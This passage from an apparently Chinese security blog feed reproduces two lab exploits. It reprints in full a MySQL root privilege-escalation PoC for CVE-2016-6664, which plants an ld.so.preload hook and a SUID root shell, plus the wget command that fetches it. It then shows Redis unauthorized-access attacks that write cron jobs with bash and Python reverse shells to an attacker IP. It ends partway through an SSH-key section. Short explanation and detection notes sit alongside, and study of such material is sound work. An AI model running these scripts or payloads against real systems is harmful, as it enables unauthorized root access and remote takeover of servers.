class="headerlink" title="Mysql权限提升为root权限"></a>Mysql权限提升为root权限</h3><p><strong>利用CVE-2016-6664</strong><br>漏洞成功利用的条件:<br>    1.) MySQL-based数据库版本符合条件<br>    2.) 攻击者已经获得MySQL系统用户权限<br>    3.) MySQL错误日志使用默认基于文件的配置, 未使用syslog</p><p>目标主机MySQL配置必须是基于文件的日志(默认配置), 也就是不能是syslog方式, 不过tutum/lamp日志方式为syslog, 需要做如下的修改</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/conf.d/mysqld_safe_syslog.cnf</span><br><span class="line">删除syslog</span><br><span class="line">重启mysql：mysqld_safe --user=mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试办法</span></span><br><span class="line">grep -r syslog /etc/mysql返回没有任何结果就满足“基于文件的日志”要求</span><br><span class="line">上传的mysql-chowned.sh 内容如下</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091638290.png" alt="image-20220409163804618"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091639515.png" alt="image-20220409163913332"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091640537.png" alt="image-20220409164030357"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091641576.png" alt="image-20220409164117395"></p><p><strong>必须以mysql权限执行才能成功提为root，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 POC 文件</span></span><br><span class="line">wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod 777 mysql-chowned.sh</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./mysql-chowned.sh /var/<span class="built_in">log</span>/mysql/error.log</span><br></pre></td></tr></tbody></table></figure><p>运行脚本之前可以查看一下error log文件的位置（默认是在mysql的数据目录下, debian上为/var/lib/mysql/hostname.err）</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091748634.png" alt="image-20220409174821674"></p><p>已提升至 root 权限</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091757476.png" alt="image-20220409175540475"></p><p><strong>POC: mysql-chowned.sh 内容如下</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line"># Usage:</span><br><span class="line"># ./mysql-chowned.sh path_to_error.log </span><br><span class="line">BACKDOORSH="/bin/bash"</span><br><span class="line">BACKDOORPATH="/tmp/mysqlrootsh"</span><br><span class="line">PRIVESCLIB="/tmp/privesclib.so"</span><br><span class="line">PRIVESCSRC="/tmp/privesclib.c"</span><br><span class="line">SUIDBIN="/usr/bin/sudo"</span><br><span class="line"></span><br><span class="line">function cleanexit {</span><br><span class="line">    # Cleanup </span><br><span class="line">    echo -e "\n[+] Cleaning up..."</span><br><span class="line">    rm -f $PRIVESCSRC</span><br><span class="line">    rm -f $PRIVESCLIB</span><br><span class="line">    rm -f $ERRORLOG</span><br><span class="line">    touch $ERRORLOG</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo -n &gt; /etc/ld.so.preload</span><br><span class="line">    fi</span><br><span class="line">    echo -e "\n[+] Job done. Exiting with code $1 \n"</span><br><span class="line">    exit $1</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function ctrl_c() {</span><br><span class="line">        echo -e "\n[+] Ctrl+C pressed"</span><br><span class="line">    cleanexit 0</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">#intro </span><br><span class="line">echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"</span><br><span class="line">echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"</span><br><span class="line"></span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"</span><br><span class="line">    echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Priv check</span><br><span class="line"></span><br><span class="line">echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"</span><br><span class="line">id | grep -q mysql </span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG="$1"</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">    echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n"</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line">echo -e "\n[+] Target MySQL log file set to $ERRORLOG"</span><br><span class="line"></span><br><span class="line"># [ Active exploitation ]</span><br><span class="line"></span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys/types.h&gt;</span><br><span class="line">       #include &lt;sys/stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) {</span><br><span class="line">    static uid_t  (*old_geteuid)();</span><br><span class="line">    old_geteuid = dlsym(RTLD_NEXT, "geteuid");</span><br><span class="line">    if ( old_geteuid() == 0 ) {</span><br><span class="line">        chown("$BACKDOORPATH", 0, 0);</span><br><span class="line">        chmod("$BACKDOORPATH", 04777);</span><br><span class="line">        //unlink("/etc/ld.so.preload");</span><br><span class="line">    }</span><br><span class="line">    return old_geteuid();</span><br><span class="line">}</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."</span><br><span class="line">    cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"</span><br><span class="line"></span><br><span class="line"># Safety check</span><br><span class="line">if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Symlink the log file to /etc</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."</span><br><span class="line">    cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"</span><br><span class="line"></span><br><span class="line"># Wait for MySQL to re-open the logs</span><br><span class="line">echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"</span><br><span class="line">echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "</span><br><span class="line">read THE_ANSWER</span><br><span class="line">if [ "$THE_ANSWER" = "y" ]; then</span><br><span class="line">    echo -e "Got it. Executing 'killall mysqld' now..."</span><br><span class="line">    killall mysqld</span><br><span class="line">fi</span><br><span class="line">while :; do </span><br><span class="line">    sleep 0.1</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">        rm -f $ERRORLOG</span><br><span class="line">        break;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"</span><br><span class="line">echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"</span><br><span class="line">echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"</span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br><span class="line">echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"</span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line">#while :; do </span><br><span class="line">#    sleep 0.1</span><br><span class="line">#    ps aux | grep mysqld | grep -q 'log-error'</span><br><span class="line">#    if [ $? -eq 0 ]; then</span><br><span class="line">#        break;</span><br><span class="line">#    fi</span><br><span class="line">#done</span><br><span class="line"></span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"</span><br><span class="line">    echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"</span><br><span class="line">else</span><br><span class="line">    echo -e "\n[!] Failed to get root"</span><br><span class="line">    cleanexit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"</span><br><span class="line">$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"</span><br><span class="line">$BACKDOORPATH -p -i</span><br><span class="line"></span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0</span><br></pre></td></tr></tbody></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>​    1.) 提权失败<br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091808433.png" alt="image-20220409180808365"><br>如果提权失败, 那么需要将容器里面 <code>/etc/ld.so.preload</code> 文件删除, 删除前记得做一个备份, <code>cp /etc/ld.so.preload /etc/ld.so.preload.upback</code> 然后删除 <code>rm -rf /etc/ld.so.preload</code> 或者也可以使用 <code>mv /etc/ld.so.preload /etc/ld.so.preload.upback</code> 直接重命名. 再次回到提权失败的地方重新运行脚本就可以成功了. </p><h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h3><h3 id="1-ld-so-preload"><a href="#1-ld-so-preload" class="headerlink" title="1. ld.so.preload"></a>1. ld.so.preload</h3><p>要理解这个漏洞的利需要首先了解/etc/ld.so.preload这个文件的作用。</p><p>这个文件的作用和LD_PRELOAD这个环境变量的作用类似：</p><p>用以指定预先装载的一些共享库或目标文件，且无论程序是否依赖这些共享库或者文件，指定的这些文件都会被装载。但是两者的区别在于LD_PRELOAD被做了限制，对于suid的程序这种预先装载目标库的功能可能会导致权限提升，所以对于suid的程序加载动态链接库时是会忽略LD_PRELOAD的。但是/etc/ld.so.preload这个配置文件却不存在这种限制。</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 参考资料4(https://minipli.wordpress.com/2009/07/17/ld_preload-vs-etcld-so-preload/)中是这么说的:</span></span><br><span class="line">LD_PRELOAD was evil <span class="keyword">when</span> combined <span class="keyword">with</span> suid binaries so it will be ignored <span class="keyword">by</span> the loader. That’s because otherwise you could abuse those binaries to raise your privileges <span class="keyword">by</span> preloading some code that spawns a shell — e.g. <span class="keyword">by</span> hooking __libc_start_main(). However, <span class="function">those restrictions <span class="keyword">do</span> <span class="keyword">not</span> apply <span class="keyword">for</span> <span class="keyword">this</span> <span class="title">file</span>(<span class="params">/etc/ld.so.preload</span>). The loader will bravely load the shared objects listed <span class="keyword">in</span> /etc/ld.so.preload even <span class="keyword">for</span> suid binaries.</span></span><br></pre></td></tr></tbody></table></figure><p>在此漏洞利用过程中ld.so.preload文件中的内容为攻击者自己编译的so文件: /tmp/privesclib.so</p><p>攻击者在/tmp/privesclib.so中自定义了geteuid函数，这个函数会在suid的程序(如sudo)中被调用</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -o sudo.txt sudo</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091813322.png" alt="img"></p><p>攻击者设置预先加载其定义so库，会导致geteuid函数被覆盖掉，当sudo调用geteuid时实际上调用的是攻击者自定义函数，可以达到一种类似hook的效果。</p><p>/etc目录只有root可写，所以要借助mysqld_safe进程创建ld.so.preload文件(mysqld_safe进程是以root权限运行的)</p><h3 id="2-漏洞利用过程"><a href="#2-漏洞利用过程" class="headerlink" title="2. 漏洞利用过程"></a>2. 漏洞利用过程</h3><p>简单梳理一下漏洞利用过程，主要分为一下几步：（可以结合poc一起看会比较清晰）</p><ol><li>准备工作：<ol><li>cp /bin/bash /tmp/mysqlrootsh</li><li>编译攻击者自定义so</li></ol></li><li>删除error.log（需要mysql权限），并新建符号链接 ln -s /etc/ld.so.preload /var/log/mysql/error.log , error.log为符号链接文件，指向一个现在不存在的ld.so.preload文件（这种情况下判断error.log是否存在，结果是不存在的，并且touch error.log的结果是新建一个ld.so.preload文件）</li><li>杀掉mysqld进程，mysqld_safe检测到mysqld进程死掉了，会重启它，在重启的过程中检查error.log是否存在，因为刚刚error.log被换为了符号链接，所以mysqld_safe认为其不存在，然后touch error.log，结果攻击者成功借助mysqld_safe的root权限新建了ld.so.preload文件</li><li>mysqld_safe进程执行chown mysql error.log ,因为error.log是符号链接，所以ld.so.preload的owner被改为mysql</li><li>echo ‘/tmp/privesclib.so’ &gt; /etc/ld.so.preload (攻击者有mysql权限，并且ld.so.preload的owner为mysql)</li><li>执行sudo, geteuid被调用，/tmp/mysqlrootsh权限的owner和group被改为root, 权限被改为04777</li><li>执行mysqlrootsh拿到root权限</li></ol><h3 id="3-漏洞-利用模型抽象"><a href="#3-漏洞-利用模型抽象" class="headerlink" title="3. 漏洞/利用模型抽象"></a>3. 漏洞/利用模型抽象</h3><p>漏洞原因用一句话总结就是:</p><p>root权限进程对文件进行敏感操作（touch/chown），被操作文件可被攻击者(非root用户)访问并换为攻击者可控文件(符号链接)，攻击者精心构造文件获得root权限</p><h3 id="4-应急响应"><a href="#4-应急响应" class="headerlink" title="4. 应急响应"></a>4. 应急响应</h3><ol><li>该漏洞的利用建立在CVE-2016-6663的基础之上，所以建议修补6663漏洞防止攻击者进一步对服务器造成危害。</li><li>短期内可使用syslog代替默认的error log，等待官方补丁</li></ol><p>攻击检测：</p><ol><li>检查mysql版本是否在存在漏洞的版本范围内</li><li>查看mysql是否开启syslog</li><li>检测是否存在/etc/ld.so.preload,/tmp/privesclib.so,/tmp/privesclib.c, /tmp/mysqlrootsh等文件</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现Redis未授权与主从复制</title>
      <link href="/2022/03/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
      <url>/2022/03/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="web安全-Redis未授权访问漏洞利用总结"><a href="#web安全-Redis未授权访问漏洞利用总结" class="headerlink" title="web安全-Redis未授权访问漏洞利用总结"></a>web安全-Redis未授权访问漏洞利用总结</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis 是一个数据库，默认端口是6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作. </p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Redis 4.x / 5.0.5以前版本</p><h2 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xz <span class="string">"Hacker"</span>                     <span class="comment"># 设置键xz的值为字符串Hacker</span></span><br><span class="line">get xz                              <span class="comment"># 获取键xz的内容</span></span><br><span class="line">SET score <span class="number">857</span>                       <span class="comment"># 设置键score的值为857</span></span><br><span class="line">INCR score                          <span class="comment"># 使用INCR命令将score的值增加1</span></span><br><span class="line">GET score                           <span class="comment"># 获取键score的内容</span></span><br><span class="line">keys *                              <span class="comment"># 列出当前数据库中所有的键</span></span><br><span class="line">config <span class="built_in">set</span> protected-mode no        <span class="comment"># 关闭安全模式</span></span><br><span class="line">get anotherkey                      <span class="comment"># 获取一个不存在的键的值</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/redis          <span class="comment"># 设置保存目录</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename redis.rdb     <span class="comment"># 设置保存文件名</span></span><br><span class="line">config get <span class="built_in">dir</span>                      <span class="comment"># 查看保存目录</span></span><br><span class="line">config get dbfilename               <span class="comment"># 查看保存文件名</span></span><br><span class="line">save                                <span class="comment"># 进行一次备份操作</span></span><br><span class="line">flushall                            <span class="comment"># 删除所有数据</span></span><br><span class="line"><span class="keyword">del</span> key                             <span class="comment"># 删除键为key的数据</span></span><br><span class="line">slaveof ip port                     <span class="comment"># 设置主从关系</span></span><br><span class="line">redis-cli -h ip -p <span class="number">6379</span> -a passwd   <span class="comment"># 外部连接</span></span><br></pre></td></tr></tbody></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>目标机：192.168.232.130 - Centos 7</li><li>攻击机：192.168.232.129 - Kali</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载安装包, 我使用的是 redis-2.8.17 版本</span></span><br><span class="line">wget https://download.redis.io/releases/redis-<span class="number">2.8</span><span class="number">.17</span>.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf redis-<span class="number">2.8</span><span class="number">.17</span>.tar.gz</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">mv redis-<span class="number">2.8</span><span class="number">.17</span> redis</span><br><span class="line"><span class="comment"># 进入文件夹</span></span><br><span class="line">cd redis</span><br><span class="line"><span class="comment"># 编译安装</span></span><br><span class="line">make</span><br><span class="line"><span class="comment"># 将配置文件复制到 etc目录下</span></span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"><span class="comment"># 进入 src 目录, 将配置文件复制到 /usr/bin/目录下</span></span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/<span class="built_in">bin</span>/</span><br><span class="line">cp redis-cli /usr/<span class="built_in">bin</span>/</span><br><span class="line"><span class="comment"># 启动 redis 服务</span></span><br><span class="line">redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意:由于redis-4.0.10版本中配置文件默认已经启用了保护，需要改/redis/redis.conf这个配置文件</span></span><br><span class="line">将 bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> &gt;&gt; <span class="comment"># bind 127.0.0.1 注释掉, 允许除本地外的ip连接</span></span><br><span class="line">将 protected-mode yes &gt;&gt; protected-mode no 关闭保护模式</span><br><span class="line"><span class="comment"># Redis默认设置运行在daemon中，可以通过/redis/redis.conf这个配置项修改, 设置为No</span></span><br><span class="line">daemonize no</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-写计划任务反弹shell"><a href="#1-写计划任务反弹shell" class="headerlink" title="1. 写计划任务反弹shell"></a>1. 写计划任务反弹shell</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接目标</span></span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.232</span><span class="number">.130</span></span><br><span class="line"><span class="comment"># 查看服务器信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 攻击机开启监听</span></span><br><span class="line">nc -lvnp <span class="number">1234</span></span><br><span class="line"><span class="comment"># 写计划任务</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.232.129/1234 0&gt;&amp;1\n"</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/ <span class="comment"># 设置工作目录</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">"root"</span> <span class="comment"># 设置用户</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n"</span> </span><br><span class="line">save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># python 反弹</span></span><br><span class="line">get <span class="number">1</span></span><br><span class="line"><span class="string">"\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"攻击机ip\",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203190101057.png" alt="image-20220319010131796"></p><p><strong>Windows</strong><br>        windows的开机任务是这个文件夹，将马写入这个文件，开机都会运行.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\</span><br></pre></td></tr></tbody></table></figure><p><strong>Linux</strong><br>        linux的计划任务的功能是crontab, 写计划任务前在反弹shell前最好加\n\n\n，末尾也加\n，这样 crontab文件里就是分行的，就不会出现bug. </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/用户名 <span class="comment">#/var/spool/cron/$USER 所有用户都可以使用</span></span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab <span class="comment">#/etc/crontab 只有 root 用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行。如：* * * * * root myCommand</span></span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="2-写ssh-keygen公钥"><a href="#2-写ssh-keygen公钥" class="headerlink" title="2. 写ssh-keygen公钥"></a>2. 写ssh-keygen公钥</h3><p>秘钥认证就是基于公钥密码的认证，使用公钥加密，私钥解密，其中公钥是公开的，放在服务器端. 可以把同一个公钥放在你想SSH登陆的服务器中，而私钥自己知道</p><p>大致过程：</p><p>​    1.客户端生成私钥和公钥，并把公钥拷贝给服务器端.<br>​    2.客户端发起登陆请求，发送自己的相关信息.<br>​    